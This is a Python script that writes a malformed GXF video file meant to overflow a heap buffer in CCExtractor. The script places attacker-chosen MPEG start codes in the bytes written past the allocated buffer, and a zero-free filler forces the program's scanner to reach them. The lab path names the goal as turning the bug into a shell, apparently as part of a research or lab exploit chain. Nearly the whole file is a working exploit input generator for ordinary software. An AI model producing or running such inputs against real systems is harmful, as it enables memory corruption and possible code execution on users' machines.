#!/usr/bin/env python3
"""Local-only GXF generator: put an MPEG start code in the overflowed bytes.

Same pinned GXF layout as make_gxf.py. The MEDIA payload is chosen so that
the first bytes written past malloc(BUFSIZE) are a sequence_header_code
(00 00 01 B3) followed by 12 bytes of sequence-header fields and a
sequence_end_code (00 00 01 B7). Everything before BUFSIZE is the zero-free
"MISHE-CCEX" pattern, so the program's own start-code scanner must walk to
the attacker-chosen bytes to find its first start code.
"""
import struct
from pathlib import Path

BUFSIZE = 2048 * 1024 + 120
PIC_SIZE = 0x201000
OUT = Path("lab/frontier/ccextractor2shell/real-build/inputs/readback.gxf")


def packet(kind: int, body: bytes) -> bytes:
    total = 16 + len(body)
    header = b"\x00\x00\x00\x00\x01" + bytes([kind]) + struct.pack(">I", total)
    return header + b"\x00\x00\x00\x00\xe1\xe2" + body


def map_packet() -> bytes:
    track = bytes([0x80 | 11, 0xC0]) + struct.pack(">H", 6)
    track += bytes([0x50, 4]) + struct.pack(">I", 6)
    body = b"\xe0\xff" + struct.pack(">H", 0) + struct.pack(">H", len(track))
    return packet(0xBC, body + track)


def main() -> None:
    seed = b"MISHE-CCEX"
    prefix = (seed * (BUFSIZE // len(seed) + 1))[:BUFSIZE]
    assert 0 not in prefix
    tail = b"\x00\x00\x01\xb3" + b"\x41" * 12 + b"\x00\x00\x01\xb7"
    tail += b"\x41" * (PIC_SIZE - BUFSIZE - len(tail))
    assert len(prefix) + len(tail) == PIC_SIZE
    body = bytes([11, 0]) + struct.pack(">I", 0) + struct.pack(">I", PIC_SIZE)
    body += struct.pack(">I", 0) + b"\x00\x00"
    data = map_packet() + packet(0xBF, body + prefix + tail)
    OUT.write_bytes(data)
    print(f"{OUT} size={len(data)} first_overflow_bytes={prefix.__len__()} -> {tail[:4].hex()}")


if __name__ == "__main__":
    main()
